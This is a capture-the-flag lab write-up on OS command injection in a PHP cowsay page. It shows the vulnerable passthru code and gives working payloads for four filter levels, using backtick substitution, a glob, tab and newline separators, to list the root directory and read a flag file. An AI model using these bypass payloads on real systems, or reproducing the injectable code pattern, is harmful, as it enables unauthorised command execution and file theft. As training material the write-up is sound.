# TL;DR

There are 4 levels of OS Command Injection in this lab.
Each level has its own way of filtering data.

# Recon

The lab accepts these inputs:

```php
$level      = $_GET['level'];
$type       = $_GET['type'];
$username   = $_GET['username'];
```

And validates `$username`:

```php
$username   = validate_username($username,$level);
```

There are 4 levels of username validation here:

```php
function validate_username($input, $level){

    // Đây là thử thách "bao cát" 4 trong 1.
    // Nhiệm vụ: tìm ra flag ở thư mục gốc /
    // Yêu cầu: Bạn phải cung cấp 04 payload lấy flag,
    // ở cả 4 level bên dưới và gửi đáp án cho giảng viên.

    switch($level){
        default:
        case 1:
            $input = addslashes($input);
            return $input;
        case 2:
            $input = substr($input,0,10);
            $input = addslashes($input);
            return $input;
        case 3:
            // Bad characters, please remove
            $input = preg_replace("/[\x{20}-\x{29}\x{2f}]/","",$input);
            $input = addslashes($input);
            return $input;
        case 4:
            // Bad characters (and more), please remove
            $input = preg_replace("/[\x{20}-\x{29}\x{2f}]/","",$input);
            $input = preg_replace("/[\x{3b}-\x{40}]/","",$input);
            $input = addslashes($input);
            return $input;
    }
}
```

There is a Command Injection vulnerability here:

```php
switch($type){
    case 'eyes':
        $cowsay = <<<EOF
        echo 'Hello $username' | cowsay -f eyes -n
        EOF;
        break;
    case 'turtle':
        $cowsay = <<<EOF
        echo 'Hello $username' | cowsay -f turtle -n
        EOF;
        break;
    case 'dragon':
        $cowsay = <<<EOF
        echo 'Hello $username' | cowsay -f dragon -n
        EOF;
        break;
    case 'figlet':
        $cowsay = <<<EOF
        echo 'Hello $username' | cowsay -n ; figlet "Hello $username"
        EOF;
        break;
    case 'toilet':
        $cowsay = <<<EOF
        echo 'Hello $username' | cowsay -n ; toilet 'Hello $username'
        EOF;
        break;
    case 'inception':
        $cowsay = <<<EOF
        echo 'Hello $username' | cowsay -n | cowthink -n
        EOF;
        break;
    case 'tenet':
        $cowsay = <<<EOF
        echo 'Hello $username' | cowsay -n | cowthink -n | cowsay -n
        EOF;
        break;
    case 'random':
    default:
        $cowsay = <<<EOF
        fortune | cowsay -n | cowthink -n
        EOF;
}
echo "[DEBUG] Command: $cowsay\n\n\n";

passthru($cowsay);
```

More specifically, when `$type` equals `figlet`:

```php
echo 'Hello $username' | cowsay -n ; figlet "Hello $username"
```

This is because the shell treats single quotes (`'`) and double quotes (`"`) differently.

For single quotes (`'`) (strong quoting): the shell will preserve everything you put inside the quotes, so something like this will not work:

```shell
echo '`echo hello`'
```

The result will just be:

```shell
`echo hello`
```

For double quotes (`"`) (weak quoting): the shell will attempt expansion if given suitable input.

And "suitable" input here includes:

- Command substitution (using backticks `` ` ``)
- Variable expansion (e.g., `echo $VAR`)
- Arithmetic expansion (using `$()`)

So the example above will just return `hello`:

```shell
echo "`echo hello`"
> hello
```

Of course, you could just escape the single quote by adding another single quote, but due to the filters (across all levels), this method will not work.

# idk what to put here

All of the payloads below will use `$type = 'figlet'`.

You can assume I send everything using this format: `/index.php?username={payload_here}&level=1&type=figlet`

The flag name will always be `secret_file`.

The content of `secret_file` will be:

```
🥷: You are master of Command Injection now! b38e625204bd8d09089d3eacc3a9c862
```

# Level 1

```php
$input = addslashes($input);
return $input;
```

This level simply adds a backslash before these characters:

```
'
"
\
NUL (NUL byte)
```

So executing commands using backticks (`) still works.

## Retrieving flag name

```
`ls /`
```

## Retrieving flag

```
`cat /secret_file`
```

# Level 2

```php
$input = substr($input,0,10);
$input = addslashes($input);
return $input;
```

This time, the server only accepts the first 10 characters of the input.

`ls /` won't be affected by this, but what about retrieving the flag?

The answer is to use `filename expansion`; in this case, I will use `*`.

## Retrieving flag name

```
`ls /`
```

## Retrieving flag

```
`cat /sec*`
```

# Level 3

```php
$input = preg_replace("/[\x{20}-\x{29}\x{2f}]/","",$input);
$input = addslashes($input);
return $input;
```

The server will now replace every character with a hex representation from `0x20` to `0x29`, as well as `0x2f`.

Those characters are:

```
 (blank space)
!
"
#
$
%
&
'
(
)
/
```

This means I won't be able to `ls` the root folder directly anymore.

So I just have to `cd` to it :b

The problem is that it also filters out blank spaces. Since the default shell for `passthru()` is `/bin/sh`, I have to find another way to separate commands.

One way to achieve this is by using the tab character (`\t`) (in hex: `%09`).

## Retrieving flag name

```
`cd\t..;cd\t..;cd\t..;ls`
```

## Retrieving flag

```
`cd\t..;cd\t..;cd\t..;cat\tsecret_file`
```

# Level 4

```php
$input = preg_replace("/[\x{20}-\x{29}\x{2f}]/","",$input);
$input = preg_replace("/[\x{3b}-\x{40}]/","",$input);
$input = addslashes($input);
```

This time, it removes all the characters from level 3, along with these characters:

```
;
<
=
>
?
@
```

So I've lost the ability to chain multiple commands using `;` :(

However, by using the newline character (`\n`), I can still recreate the exact behavior.

## Retrieving flag name

```
`cd\t..\ncd\t..\ncd\t..\nls`
```

## Retrieving flag

```
`cd\t..\ncd\t..\ncd\t..\ncat\tsecret_file`
```
